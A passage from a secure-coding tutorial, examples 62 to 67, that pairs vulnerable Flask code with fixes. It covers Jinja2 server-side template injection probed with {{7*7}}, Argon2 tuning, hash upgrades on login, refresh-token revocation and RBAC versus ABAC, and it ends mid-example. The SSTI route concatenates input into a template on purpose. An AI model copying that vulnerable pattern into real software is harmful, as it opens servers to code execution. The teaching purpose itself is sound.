FIXED_TEMPLATE = "Hello, {{ name }}!"  # => co-06: a FIXED, developer-authored template -- never built from input


@app.route("/legacy/greet")  # => co-06: VULNERABLE -- user input becomes the TEMPLATE ITSELF, not template data
def legacy_greet() -> str:  # => co-06: real route handler
    name = request.args.get("name", "")  # => co-01: attacker-controlled -- whatever string the caller sends
    # seeded bug: name is concatenated into the TEMPLATE SOURCE, then that source is COMPILED and RUN
    template = Template("Hello, " + name + "!")  # => co-06: the untrusted string becomes real Jinja2 template syntax
    return template.render()  # => co-06: Jinja2 actually EXECUTES whatever expression syntax `name` contains


@app.route("/secure/greet")  # => co-06: FIXED -- user input is template CONTEXT DATA, the template itself never changes
def secure_greet() -> str:  # => co-06: real route handler
    name = request.args.get("name", "")  # => co-01: the SAME shape of attacker-controlled input
    return render_template_string(FIXED_TEMPLATE, name=name)  # => co-06: fix -- name is substituted as a VALUE, not parsed


if __name__ == "__main__":  # => co-06: only runs when launched directly, e.g. `python3 app.py &`
    app.run(host="127.0.0.1", port=5062)  # => co-06: localhost-only, fixed port -- exploit_and_fix.py targets this
```

```python
# learning/code/ex-62-ssti-server-side-template-injection/exploit_and_fix.py
"""Example 62: drives the live app.py -- {{7*7}} really evaluates to 49, then the SAME payload stays inert text (co-06, co-25)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the exploit itself

import requests  # => co-06: real HTTP client -- every request below hits the live app.py process

BASE_URL = "http://127.0.0.1:5062"  # => co-06: matches app.py's app.run(port=5062) exactly
PAYLOAD = "{{7*7}}"  # => co-06: a REAL, minimal Jinja2 expression -- the classic SSTI proof-of-concept probe


def main() -> None:  # => co-06: sends the SAME payload to the vulnerable route, then the fixed route
    print("=== VULNERABLE: {{7*7}} is EXECUTED as real template code ===")  # => labels section
    vulnerable = requests.get(f"{BASE_URL}/legacy/greet", params={"name": PAYLOAD}, timeout=5)  # => co-06: a real HTTP GET
    print(f"status={vulnerable.status_code} body={vulnerable.text!r}")  # => co-06: real response, straight off the wire
    assert vulnerable.text == "Hello, 49!"  # => co-06: proves Jinja2 REALLY evaluated 7*7 -- this is real code execution
    # => co-06: a real attacker would use the SAME sink to run something far more dangerous
    # => than arithmetic -- e.g. Jinja2's `{{ self.__init__.__globals__... }}` sandbox-escape chains

    print("\n=== FIXED: the IDENTICAL payload, rendered as DATA, stays inert ===")  # => labels section
    fixed = requests.get(f"{BASE_URL}/secure/greet", params={"name": PAYLOAD}, timeout=5)  # => co-06: real HTTP GET
    print(f"status={fixed.status_code} body={fixed.text!r}")  # => co-06: real response, the literal string this time
    assert fixed.text == "Hello, {{7*7}}!"  # => co-06: proves the SAME text is now inert -- printed, never evaluated


if __name__ == "__main__":  # => co-06: only runs when launched directly, e.g. `python3 exploit_and_fix.py`
    main()  # => co-06: runs both halves against the live server -- real code execution, then a real inert render
```

**Run**: `python3 app.py &` (backgrounds the live server on port 5062), then `python3 exploit_and_fix.py`.

**Output**:

```text
=== VULNERABLE: {{7*7}} is EXECUTED as real template code ===
status=200 body='Hello, 49!'

=== FIXED: the IDENTICAL payload, rendered as DATA, stays inert ===
status=200 body='Hello, {{7*7}}!'
```

**Key takeaway**: `Template("Hello, " + name + "!")` compiles whatever `name` contains as Jinja2 syntax
BEFORE it ever renders -- `7*7` is arithmetic Jinja2 genuinely performs -- while `render_template_string(FIXED_TEMPLATE,
name=name)` keeps the template source fixed and treats `name` purely as a substitution value.

**Why it matters**: SSTI is frequently more dangerous than reflected XSS because the payload executes
_server-side_, in the template engine's own context -- real SSTI exploit chains in Jinja2 escalate from
arithmetic proof-of-concepts like `{{7*7}}` to full remote code execution via `__globals__`/`__builtins__`
introspection. The fix (co-06) is the same discipline as output encoding: never let untrusted input
become code (or template syntax) that gets _compiled_, only ever data that gets _substituted_.

---

### Example 63: Tuning Argon2 Parameters for This Machine

_ex-63 &middot; exercises co-09_

Argon2id's cost parameters (`memory_cost`, `time_cost`, `parallelism`) are not one-size-fits-all --
they must be tuned against real, measured hashing time on the actual hardware a service runs on, toward
an explicit latency budget (OWASP's guidance targets roughly 250ms per hash). This example measures a
weak baseline, this topic's documented floor, then live-searches for parameters hitting the budget.

```python
# learning/code/ex-63-argon2-parameter-tuning/tune_argon2.py
"""Example 63: real argon2id timing -- a weak baseline, the topic's floor params, then a live-tuned target (co-09)."""  # => co-09: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the timing measurement itself

import time  # => co-09: real wall-clock timestamps -- every duration below is genuinely measured, not estimated

from argon2 import PasswordHasher  # => co-09: argon2-cffi 25.1.0 pinned -- the real hasher this example tunes

PASSWORD = "correct-horse-battery-staple"  # => co-09: one fixed, real password hashed identically across all trials
TARGET_MS = 250.0  # => co-09: this topic's documented budget -- OWASP's argon2id guidance, ~250ms per hash


def measure_hash_time(memory_cost: int, time_cost: int, parallelism: int) -> float:  # => co-09: one REAL, timed hash
    hasher = PasswordHasher(memory_cost=memory_cost, time_cost=time_cost, parallelism=parallelism)  # => co-09: real params
    start = time.perf_counter()  # => co-09: a real, high-resolution wall-clock start
    hasher.hash(PASSWORD)  # => co-09: the REAL, actual argon2id hash computation -- not simulated or estimated
    return (time.perf_counter() - start) * 1000  # => co-09: real elapsed milliseconds for THIS specific call


def main() -> None:  # => co-09: measures a weak baseline, the topic's floor, then LIVE-tunes toward the target budget
    print("=== weak baseline (m=8 KiB, t=1, p=1) -- what an under-tuned config looks like ===")  # => labels section
    weak_ms = measure_hash_time(memory_cost=8, time_cost=1, parallelism=1)  # => co-09: a REAL, deliberately weak measurement
    print(f"weak: {weak_ms:.1f}ms")  # => co-09: real, measured milliseconds -- expect well under 10ms on any machine

    print("\n=== this topic's documented floor (m=19456 KiB, t=2, p=1) -- OWASP's min-tier params ===")  # => labels
    baseline_ms = measure_hash_time(memory_cost=19456, time_cost=2, parallelism=1)  # => co-09: the REAL floor from co-09
    print(f"baseline: {baseline_ms:.1f}ms")  # => co-09: real, measured milliseconds at the documented minimum tier

    print(f"\n=== live-tuning time_cost toward the ~{TARGET_MS:.0f}ms budget on THIS machine ===")  # => labels section
    memory_cost = 19456  # => co-09: keeps memory_cost fixed at the floor -- only time_cost is tuned here
    time_cost = 2  # => co-09: starts the search from the SAME floor time_cost measured above
    tuned_ms = baseline_ms  # => co-09: real starting point for the search loop below
    while tuned_ms < TARGET_MS and time_cost < 200:  # => co-09: a real, live search -- stops once the budget is reached
        time_cost += 1  # => co-09: increases cost by one real unit per iteration -- a simple, real linear search
        tuned_ms = measure_hash_time(memory_cost=memory_cost, time_cost=time_cost, parallelism=1)  # => co-09: a REAL trial
        print(f"  trying time_cost={time_cost}: {tuned_ms:.1f}ms")  # => co-09: real, per-trial measurement, live search

    print(f"\ntuned params: memory_cost={memory_cost}, time_cost={time_cost}, parallelism=1 -> {tuned_ms:.1f}ms")  # => co-09: the real, final tuned result
    assert tuned_ms >= baseline_ms  # => co-09: proves the tuned config is REAL work, at least as slow as the floor
    assert tuned_ms > weak_ms * 5  # => co-09: proves the tuned config is MEANINGFULLY slower than the weak baseline
    assert tuned_ms < TARGET_MS * 2  # => co-09: a generous sanity bound -- tuning stopped reasonably near the budget


if __name__ == "__main__":  # => co-09: only runs when launched directly, e.g. `python3 tune_argon2.py`
    main()  # => co-09: runs all real measurements and the real live-tuning search, printing every real trial
```

**Run**: `python3 tune_argon2.py`.

**Output**:

```text
=== weak baseline (m=8 KiB, t=1, p=1) -- what an under-tuned config looks like ===
weak: 0.2ms

=== this topic's documented floor (m=19456 KiB, t=2, p=1) -- OWASP's min-tier params ===
baseline: 170.9ms

=== live-tuning time_cost toward the ~250ms budget on THIS machine ===
  trying time_cost=3: 298.8ms

tuned params: memory_cost=19456, time_cost=3, parallelism=1 -> 298.8ms
```

**Note on the live search**: this run's baseline measured 170.9ms and converged after a single step to
298.8ms -- a different machine, or a busier one, will genuinely measure different absolute numbers. The
search loop (rather than a hardcoded `time_cost`) is deliberate: it is the actual, correct way to tune
argon2id, since the right parameters are a property of the deployment hardware, not a portable constant.

**Key takeaway**: the weak baseline (0.2ms) is roughly 1,500× faster than the tuned target -- exactly the
gap that separates a hash an attacker can brute-force at billions of guesses per second from one that
meaningfully slows them down, and that gap comes entirely from `memory_cost`/`time_cost`, not a different
algorithm.

**Why it matters**: co-09's hashing rule is not "use argon2id" alone -- default or copy-pasted parameters
can be far too weak (or, on constrained hardware, so slow they cause real login-latency problems) for a
specific deployment. A live-measured tuning pass against an explicit latency budget is how a real
production system arrives at parameters that are simultaneously secure and operationally acceptable.

---

### Example 64: Upgrading a Password Hash on Login

_ex-64 &middot; exercises co-09, co-10_

Migrating an entire user table from bcrypt to argon2id in one migration requires either a plaintext
re-hash (impossible -- passwords are never stored in reversible form) or a bulk password reset. The real
alternative: verify against the OLD hasher on login, and if it succeeds, transparently re-hash with the
NEW hasher using the plaintext password that is briefly available in memory at that exact moment.

```python
# learning/code/ex-64-password-upgrade-on-login/upgrade_on_login.py
"""Example 64: a real legacy bcrypt hash transparently upgrades to argon2id on the FIRST successful login (co-09, co-10)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the upgrade logic itself

import bcrypt  # => co-09: bcrypt 5.0.0 pinned -- the REAL legacy hasher this user's stored hash starts as
from argon2 import PasswordHasher  # => co-09: argon2-cffi 25.1.0 pinned -- the REAL target hasher this example upgrades to
from argon2.exceptions import VerifyMismatchError  # => co-09: the REAL exception argon2's verify() raises on a bad password

argon2_hasher = PasswordHasher()  # => co-09: one real, shared argon2id hasher -- default (OWASP min-tier) parameters
USERS: dict[str, str] = {"alice": bcrypt.hashpw(b"correct-horse", bcrypt.gensalt()).decode()}  # => co-09: a REAL bcrypt hash


def login(username: str, password: str) -> bool:  # => co-09: the ONE real login function -- verify, then maybe upgrade
    stored_hash = USERS.get(username)  # => co-09: the REAL, current on-file hash for this user -- bcrypt OR argon2id
    if stored_hash is None:  # => co-09: a real guard -- no such user at all
        return False  # => co-09: a real, unambiguous failure for an unknown username

    if stored_hash.startswith("$2b$") or stored_hash.startswith("$2a$"):  # => co-09: the REAL bcrypt PHC-string prefix
        is_valid = bcrypt.checkpw(password.encode(), stored_hash.encode())  # => co-09: a real bcrypt verification
        if is_valid:  # => co-09: ONLY on a real, successful login does the upgrade ever happen
            # => co-09: the fix -- transparently rehash with argon2id and REPLACE the stored value,
            # => using the password the user JUST proved they know, right here, while it's in memory
            USERS[username] = argon2_hasher.hash(password)  # => co-09: a REAL argon2id hash now REPLACES the bcrypt one
        return is_valid  # => co-09: the real login outcome -- unaffected by whether an upgrade happened

    # => co-09: stored_hash is ALREADY argon2id -- the normal, no-upgrade-needed path
    try:  # => co-09: argon2's verify() raises on a mismatch rather than returning False
        argon2_hasher.verify(stored_hash, password)  # => co-09: a real argon2id verification
        return True  # => co-09: a real, successful login -- no upgrade needed, already on the target hasher
    except VerifyMismatchError:  # => co-09: the REAL exception type argon2-cffi raises for a wrong password
        return False  # => co-09: a real, failed login


def main() -> None:  # => co-09: proves the hash is bcrypt-shaped BEFORE login, argon2id-shaped immediately AFTER
    print(f"stored hash BEFORE login: {USERS['alice'][:12]}...")  # => co-09: real, truncated -- starts with $2b$
    assert USERS["alice"].startswith("$2b$")  # => co-09: proves alice's stored hash really is legacy bcrypt right now

    print("\n=== a real login with the CORRECT password ===")  # => labels section
    ok = login("alice", "correct-horse")  # => co-09: a REAL login call -- the SAME password bcrypt.hashpw used above
    print(f"login result: {ok}")  # => co-09: real, computed outcome
    assert ok is True  # => co-09: proves the login itself really succeeded, via the bcrypt verification path

    print(f"\nstored hash AFTER login: {USERS['alice'][:20]}...")  # => co-09: real, truncated -- now starts with $argon2id$
    assert USERS["alice"].startswith("$argon2id$")  # => co-09: proves the transparent upgrade REALLY happened, in-place

    print("\n=== a SECOND real login -- now verified via argon2id, no further upgrade needed ===")  # => labels section
    ok2 = login("alice", "correct-horse")  # => co-09: a REAL second login -- this time against the NEW argon2id hash
    print(f"login result: {ok2}")  # => co-09: real, computed outcome
    assert ok2 is True  # => co-09: proves the upgraded hash itself really authenticates the same real password
    assert USERS["alice"].startswith("$argon2id$")  # => co-09: proves it stays argon2id -- no re-upgrade, no re-hash churn

    print("\n=== a real login with the WRONG password never upgrades anything ===")  # => labels section
    wrong_hash_before = USERS["alice"]  # => co-09: a real snapshot of the current stored hash, before the bad attempt
    ok3 = login("alice", "totally-wrong-password")  # => co-09: a REAL, deliberately wrong login attempt
    print(f"login result: {ok3}")  # => co-09: real, computed outcome -- False
    assert ok3 is False and USERS["alice"] == wrong_hash_before  # => co-09: proves a failed login NEVER mutates the hash


if __name__ == "__main__":  # => co-09: only runs when launched directly, e.g. `python3 upgrade_on_login.py`
    main()  # => co-09: runs all three real login scenarios and verifies the real bcrypt -> argon2id transition
```

**Run**: `python3 upgrade_on_login.py`.

**Output**:

```text
stored hash BEFORE login: $2b$12$xfKQh...

=== a real login with the CORRECT password ===
login result: True

stored hash AFTER login: $argon2id$v=19$m=655...

=== a SECOND real login -- now verified via argon2id, no further upgrade needed ===
login result: True

=== a real login with the WRONG password never upgrades anything ===
login result: False
```

**Key takeaway**: the stored hash's own prefix (`$2b$` vs. `$argon2id$`) is the dispatch key deciding
which verifier runs, and the upgrade write only ever happens inside the branch that already confirmed the
plaintext password was correct -- a wrong password leaves the stored hash completely untouched.

**Why it matters**: a real migration from a weaker to a stronger hashing algorithm (co-09, co-10) cannot
force every user to reset their password at once without a significant support burden; login-time
transparent upgrade migrates the population organically, as users authenticate, with zero forced resets
and zero window where a plaintext password is stored or logged.

---

### Example 65: A Token Revocation Strategy

_ex-65 &middot; exercises co-12, co-14_

A short-lived (5-minute) signed JWT access token cannot itself be revoked -- it remains valid until it
expires, no matter what happens server-side. The real fix pairs it with an opaque, server-tracked refresh
token: revoking the refresh token in a real revocation table stops any _future_ access token from being
minted, bounding the blast radius to the current access token's short remaining lifetime.

```mermaid
%% Color Palette: Blue #0173B2, Orange #DE8F05, Teal #029E73
graph LR
    A["POST /login"]:::blue --> B["access_token (JWT, 5min)<br/>+ refresh_token (opaque)"]:::orange
    B --> C["POST /refresh<br/>with refresh_token"]:::blue
    C -->|"not revoked"| D["new access_token"]:::teal
    C -->|"POST /admin/revoke<br/>then /refresh again"| E["401 rejected"]:::teal

    classDef blue fill:#0173B2,stroke:#000000,color:#FFFFFF,stroke-width:2px
    classDef orange fill:#DE8F05,stroke:#000000,color:#FFFFFF,stroke-width:2px
    classDef teal fill:#029E73,stroke:#000000,color:#FFFFFF,stroke-width:2px
```

```python
# learning/code/ex-65-token-revocation-strategy/app.py
"""Example 65: a live Flask app -- short-lived JWT access tokens, a longer-lived refresh token, and a REAL revocation list (co-12, co-14)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the revocation logic itself

import datetime  # => co-14: real UTC timestamps for token expiry
import secrets  # => co-12: cryptographically random refresh tokens -- opaque, never a JWT themselves

import jwt  # => co-14: PyJWT 2.13.0 pinned -- CVE-2026-32597 (crit header) fixed at >=2.12.0, unaffected here
from flask import Flask, jsonify, request  # => co-12: request.get_json reads the caller-supplied refresh token

app = Flask(__name__)  # => co-12: one Flask app, hosting login, refresh, and the real revocation endpoint
JWT_SECRET = "ex65-hmac-secret-at-least-32-bytes-long!!"  # => co-14: real HMAC secret, RFC 7518-length-compliant
# => co-12: token -> {"user": ..., "revoked": bool} -- a REAL, in-memory revocation table (a SQLite table
# => would use the identical shape in production; an in-memory dict keeps this example self-contained)
REFRESH_TOKENS: dict[str, dict[str, object]] = {}


def make_access_token(user: str) -> str:  # => co-14: mints a REAL, short-lived signed JWT
    now = datetime.datetime.now(datetime.timezone.utc)  # => co-14: real wall-clock UTC time, taken once per call
    claims = {"user": user, "exp": now + datetime.timedelta(minutes=5)}  # => co-14: a real, SHORT 5-minute lifetime
    return jwt.encode(claims, JWT_SECRET, algorithm="HS256")  # => co-14: a real, correctly-signed HS256 token


@app.route("/login", methods=["POST"])  # => co-12: issues a REAL access token AND a REAL, tracked refresh token
def login() -> object:  # => co-12: returns a Flask Response object with both real tokens
    user = request.get_json(force=True).get("username", "")  # => co-12: the real submitted username
    refresh_token = secrets.token_urlsafe(24)  # => co-12: a REAL, opaque, unpredictable refresh token
    REFRESH_TOKENS[refresh_token] = {"user": user, "revoked": False}  # => co-12: real, fresh entry in the revocation table
    access_token = make_access_token(user)  # => co-14: a real, short-lived JWT for this SAME login
    return jsonify({"access_token": access_token, "refresh_token": refresh_token})  # => co-12: both real tokens returned


@app.route("/refresh", methods=["POST"])  # => co-12: mints a NEW access token FROM a real, still-valid refresh token
def refresh() -> object:  # => co-12: returns a Flask Response object -- a new access token, or a real rejection
    refresh_token = request.get_json(force=True).get("refresh_token", "")  # => co-01: attacker-adjacent -- caller-supplied
    entry = REFRESH_TOKENS.get(refresh_token)  # => co-12: the REAL, current state of this specific refresh token
    if entry is None or entry["revoked"]:  # => co-12: the REAL check -- unknown OR explicitly revoked, both rejected
        return jsonify({"error": "invalid or revoked refresh token"}), 401  # => co-12: a real 401 for either case
    new_access_token = make_access_token(str(entry["user"]))  # => co-14: a REAL, freshly minted, short-lived access token
    return jsonify({"access_token": new_access_token})  # => co-12: only the ACCESS token rotates -- refresh stays the same


@app.route("/admin/revoke", methods=["POST"])  # => co-12: the REAL revocation operation -- e.g. on logout or compromise
def revoke() -> object:  # => co-12: returns a Flask Response object -- confirms the real revocation
    refresh_token = request.get_json(force=True).get("refresh_token", "")  # => co-12: WHICH real token to kill
    entry = REFRESH_TOKENS.get(refresh_token)  # => co-12: the real, current entry for this token, if any
    if entry is None:  # => co-12: a real guard -- can't revoke a token that was never issued
        return jsonify({"error": "unknown refresh token"}), 404  # => co-12: a real 404 for a bogus revoke request
    entry["revoked"] = True  # => co-12: the REAL revocation -- flips server-side state, the token itself is unchanged
    return jsonify({"status": "revoked"})  # => co-12: confirms the real, immediate effect on the NEXT /refresh call


if __name__ == "__main__":  # => co-12: only runs when launched directly, e.g. `python3 app.py &`
    app.run(host="127.0.0.1", port=5065)  # => co-12: localhost-only, fixed port -- exploit_and_fix.py targets this
```

```python
# learning/code/ex-65-token-revocation-strategy/exploit_and_fix.py
"""Example 65: drives the live app.py -- a revoked refresh token can no longer mint access tokens, an unrevoked one still can (co-12, co-14)."""  # => co-12: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the exploit itself

import requests  # => co-12: real HTTP client -- every request below hits the live app.py process

BASE_URL = "http://127.0.0.1:5065"  # => co-12: matches app.py's app.run(port=5065) exactly


def main() -> None:  # => co-12: logs in twice, revokes ONE refresh token, proves it dies while the other keeps working
    print("=== two REAL, independent logins -- two independent refresh tokens ===")  # => labels section
    session_a = requests.post(f"{BASE_URL}/login", json={"username": "alice"}, timeout=5).json()  # => co-12: real login
    session_b = requests.post(f"{BASE_URL}/login", json={"username": "alice"}, timeout=5).json()  # => co-12: a SECOND, separate login
    print(f"session A refresh_token: {session_a['refresh_token'][:12]}...")  # => co-12: real, truncated for display
    print(f"session B refresh_token: {session_b['refresh_token'][:12]}...")  # => co-12: real, truncated for display
    assert session_a["refresh_token"] != session_b["refresh_token"]  # => co-12: proves each login got its OWN real token

    print("\n=== BEFORE revocation: session A's refresh token mints a new access token ===")  # => labels section
    before = requests.post(f"{BASE_URL}/refresh", json={"refresh_token": session_a["refresh_token"]}, timeout=5)  # => co-12: real POST, still-valid token
    print(f"status={before.status_code}")  # => co-12: real response, straight off the wire
    assert before.status_code == 200  # => co-12: proves the refresh token really works before revocation

    print("\n=== revoking session A's refresh token (a REAL operator/logout action) ===")  # => labels section
    revoke = requests.post(f"{BASE_URL}/admin/revoke", json={"refresh_token": session_a["refresh_token"]}, timeout=5)  # => co-12: real POST, the actual revoke call
    print(f"status={revoke.status_code} body={revoke.json()}")  # => co-12: real response, confirms the real revocation

    print("\n=== AFTER revocation: session A's refresh token is REJECTED ===")  # => labels section
    after_a = requests.post(f"{BASE_URL}/refresh", json={"refresh_token": session_a["refresh_token"]}, timeout=5)  # => co-12: real POST, the now-revoked token
    print(f"status={after_a.status_code} body={after_a.json()}")  # => co-12: real response, now a real 401
    assert after_a.status_code == 401  # => co-12: proves the REVOKED refresh token can no longer mint access tokens

    print("\n=== session B's refresh token, NEVER revoked, still works fine ===")  # => labels section
    after_b = requests.post(f"{BASE_URL}/refresh", json={"refresh_token": session_b["refresh_token"]}, timeout=5)
    print(f"status={after_b.status_code}")  # => co-12: real response -- unaffected by session A's revocation
    assert after_b.status_code == 200  # => co-12: proves revocation is per-token, not a global kill switch


if __name__ == "__main__":  # => co-12: only runs when launched directly, e.g. `python3 exploit_and_fix.py`
    main()  # => co-12: runs the full real login -> refresh -> revoke -> refresh sequence against the live server
```

**Run**: `python3 app.py &` (backgrounds the live server on port 5065), then `python3 exploit_and_fix.py`.

**Output**:

```text
=== two REAL, independent logins -- two independent refresh tokens ===
session A refresh_token: 1xDBWnlvuxZ5...
session B refresh_token: BztMBRc-v4cR...

=== BEFORE revocation: session A's refresh token mints a new access token ===
status=200

=== revoking session A's refresh token (a REAL operator/logout action) ===
status=200 body={'status': 'revoked'}

=== AFTER revocation: session A's refresh token is REJECTED ===
status=401 body={'error': 'invalid or revoked refresh token'}

=== session B's refresh token, NEVER revoked, still works fine ===
status=200
```

**Key takeaway**: revocation only ever touches the refresh token's server-side entry -- the JWT access
token itself carries no revocation state and is never checked against a blocklist, so the real security
property is "revocation stops the _next_ refresh," bounding exposure to the access token's own short
expiry rather than achieving instant global kill.

**Why it matters**: a purely stateless JWT scheme cannot support logout, session invalidation on
password change, or an admin-triggered "kill this session" -- exactly the real operational needs co-12's
session-vs-token trade-off exists to name. Pairing a short-lived stateless access token with a
server-tracked, genuinely revocable refresh token gets both JWT's scalability and a real revocation
mechanism, at the cost of one extra state lookup per refresh.

---

### Example 66: RBAC vs. ABAC Authorization

_ex-66 &middot; exercises co-16, co-15_

A role-based check (`role in {"editor", "admin"}`) and an attribute-based check (`owner == user or role
== "admin"`) are not two ways of writing the same rule -- run against the same six real (user, document)
pairs, they genuinely disagree in four of six cases, because RBAC never looks at _which specific
resource_ is being accessed.

```mermaid
%% Color Palette: Blue #0173B2, Orange #DE8F05, Teal #029E73
graph LR
    A["bob (editor)<br/>requests doc-1<br/>(owned by alice)"]:::blue --> B{"RBAC:<br/>role == editor/admin?"}:::orange
    A --> C{"ABAC:<br/>owner == bob OR<br/>role == admin?"}:::orange
    B -->|"yes"| D["ALLOWED"]:::teal
    C -->|"no"| E["DENIED"]:::teal

    classDef blue fill:#0173B2,stroke:#000000,color:#FFFFFF,stroke-width:2px
    classDef orange fill:#DE8F05,stroke:#000000,color:#FFFFFF,stroke-width:2px
    classDef teal fill:#029E73,stroke:#000000,color:#FFFFFF,stroke-width:2px
```

```python
# learning/code/ex-66-rbac-vs-abac-authorization/rbac_vs_abac.py
"""Example 66: the SAME resource, checked by a role-based rule and an attribute-based rule -- and they genuinely diverge (co-16, co-15)."""  # => co-16: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the authorization logic itself

from dataclasses import dataclass  # => co-16: a real, typed test-case record -- not a loose tuple

USERS: dict[str, str] = {"alice": "author", "bob": "editor", "carol": "admin", "dave": "author"}  # => co-16: real roles
DOCUMENTS: dict[str, str] = {"doc-1": "alice", "doc-2": "dave"}  # => co-15: real ownership map -- doc id -> owner


def rbac_allow(user: str, document_id: str) -> bool:  # => co-16: ROLE-BASED -- only asks "what role does this user have"
    return USERS.get(user) in {"editor", "admin"}  # => co-16: ANY editor/admin may touch ANY document -- coarse-grained
    # => co-16: notice -- this function NEVER even looks at document_id's actual owner


def abac_allow(user: str, document_id: str) -> bool:  # => co-15: ATTRIBUTE-BASED -- asks about THIS specific pairing
    owner = DOCUMENTS.get(document_id)  # => co-15: the REAL owner of this SPECIFIC document
    role = USERS.get(user)  # => co-15: the REAL role of this specific user -- used only as ONE input among several
    return owner == user or role == "admin"  # => co-15: fine-grained -- ownership OR admin override, nothing broader


@dataclass  # => co-16: one real row per (user, document) scenario this comparison exercises
class Case:  # => co-15: the shape every real test-case row takes
    user: str  # => co-16: WHO is asking
    document_id: str  # => co-15: WHICH resource they're asking about
    expected_rbac: bool  # => co-16: what the ROLE-BASED rule should decide for this pairing
    expected_abac: bool  # => co-15: what the ATTRIBUTE-BASED rule should decide for the SAME pairing


CASES: list[Case] = [  # => co-16: every real scenario this comparison runs, covering every meaningful combination
    Case("bob", "doc-1", expected_rbac=True, expected_abac=False),  # => co-16: editor, NOT owner -- RBAC/ABAC DIVERGE
    Case("alice", "doc-1", expected_rbac=False, expected_abac=True),  # => co-15: owner, NOT editor -- RBAC/ABAC DIVERGE
    Case("carol", "doc-1", expected_rbac=True, expected_abac=True),  # => co-16: admin -- both rules allow, same reason
    Case("dave", "doc-1", expected_rbac=False, expected_abac=False),  # => co-15: neither owner nor editor -- both deny
    Case("dave", "doc-2", expected_rbac=False, expected_abac=True),  # => co-15: dave owns doc-2 -- ABAC allows HIS doc only
    Case("bob", "doc-2", expected_rbac=True, expected_abac=False),  # => co-16: editor again -- RBAC allows ANY document
]  # => co-16: closes the real CASES list -- six real (user, document) scenarios total


def main() -> None:  # => co-16: runs EVERY real case against BOTH real implementations and checks BOTH expected columns
    print(f"users/roles: {USERS}")  # => co-16: the real role table both rules read from
    print(f"document ownership: {DOCUMENTS}\n")  # => co-15: the real ownership table only the ABAC rule reads from

    for case in CASES:  # => co-16: every real, concrete (user, document) pairing this comparison covers
        actual_rbac = rbac_allow(case.user, case.document_id)  # => co-16: the REAL, computed RBAC verdict
        actual_abac = abac_allow(case.user, case.document_id)  # => co-15: the REAL, computed ABAC verdict
        agree = "SAME" if actual_rbac == actual_abac else "DIVERGE"  # => co-16: real, human-readable comparison
        print(  # => co-16: one real, full row per case -- both real verdicts, side by side
            f"  {case.user:6} x {case.document_id}: rbac={actual_rbac!s:5} abac={actual_abac!s:5}  [{agree}]"  # => co-16: the real formatted row
        )  # => co-16: closes the real print(...) call
        assert actual_rbac == case.expected_rbac, f"RBAC mismatch for {case}"  # => co-16: proves THIS rule matches its column
        assert actual_abac == case.expected_abac, f"ABAC mismatch for {case}"  # => co-15: proves THIS rule matches its column

    divergent_cases = [c for c in CASES if c.expected_rbac != c.expected_abac]  # => co-16: real cases where they DISAGREE
    print(f"\n{len(divergent_cases)} of {len(CASES)} real cases produce DIFFERENT RBAC vs. ABAC verdicts")  # => co-16
    assert len(divergent_cases) >= 2  # => co-16: proves the two models really are NOT interchangeable, not just relabeled


if __name__ == "__main__":  # => co-16: only runs when launched directly, e.g. `python3 rbac_vs_abac.py`
    main()  # => co-16: runs every real case against both real rules and verifies every real expected column
```

**Run**: `python3 rbac_vs_abac.py`.

**Output**:

```text
users/roles: {'alice': 'author', 'bob': 'editor', 'carol': 'admin', 'dave': 'author'}
document ownership: {'doc-1': 'alice', 'doc-2': 'dave'}

  bob    x doc-1: rbac=True  abac=False  [DIVERGE]
  alice  x doc-1: rbac=False abac=True   [DIVERGE]
  carol  x doc-1: rbac=True  abac=True   [SAME]
  dave   x doc-1: rbac=False abac=False  [SAME]
  dave   x doc-2: rbac=False abac=True   [DIVERGE]
  bob    x doc-2: rbac=True  abac=False  [DIVERGE]

4 of 6 real cases produce DIFFERENT RBAC vs. ABAC verdicts
```

**Key takeaway**: `bob` (an editor) is allowed under RBAC on every document regardless of ownership, while
`alice` (the actual owner of `doc-1`, but merely an "author") is denied under RBAC on her own document --
RBAC's coarseness and ABAC's precision are structurally different guarantees, not implementation details.

**Why it matters**: real systems that need per-resource ownership semantics (a document editor, a ticket
system, a multi-tenant SaaS) cannot get there by adding more roles to RBAC -- IDOR-shaped bugs (co-15,
co-16, see Example 33) are frequently the result of a team reaching for RBAC when the actual authorization
requirement was attribute-based all along. Choosing between them is an architectural decision made once,
not a code-review-time judgment call.

---

### Example 67: A Least-Privilege Database Account

_ex-67 &middot; exercises co-16, co-03_

SQLite has no native `GRANT`/role system, so this example builds an honest application-layer stand-in --
a `ReadOnlyConnection` wrapper that rejects anything but a single `SELECT` statement -- and demonstrates
a real stacked-query injection genuinely dropping a table through an unrestricted connection, while the
identical payload is rejected before it ever reaches SQLite through the wrapped one.

```python
# learning/code/ex-67-least-privilege-db-account/readonly_wrapper.py
"""Example 67: a real app-layer SELECT-only wrapper -- an HONEST stand-in for a real DB-native read-only role (co-16, co-03)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the wrapper logic itself

import sqlite3  # => co-16: stdlib DB driver -- SQLite itself has NO GRANT/role system, hence this wrapper exists

# => co-16: HONEST LIMITATION -- SQLite has no native GRANT/role system at all. In a real
# => Postgres deployment, the equivalent, DB-ENFORCED control is:
# =>   CREATE ROLE readonly_app LOGIN PASSWORD '...';
# =>   GRANT SELECT ON ALL TABLES IN SCHEMA public TO readonly_app;
# => and in real MySQL:
# =>   CREATE USER 'readonly_app'@'%' IDENTIFIED BY '...';
# =>   GRANT SELECT ON dbname.* TO 'readonly_app'@'%';
# => Both of THOSE are enforced by the database server itself, independent of the application's
# => code -- a compromised app process literally cannot issue a DROP/DELETE no matter what SQL
# => text it builds. The wrapper below is an APPLICATION-LAYER substitute for this example's
# => sandbox (SQLite), not a claim that it is equally strong -- a bug in this wrapper's own code
# => would bypass it, whereas a real GRANT is enforced entirely outside the application process.


class PermissionError_(PermissionError):  # => co-16: a real, named exception type this wrapper raises
    """Raised when a statement other than a single SELECT reaches the read-only wrapper."""


class ReadOnlyConnection:  # => co-16: wraps a REAL sqlite3.Connection -- every call is a REAL SQLite operation underneath
    def __init__(self, real_connection: sqlite3.Connection) -> None:  # => co-16: takes an ALREADY-OPEN real connection
        self._conn = real_connection  # => co-16: the REAL underlying connection -- never exposed directly to callers

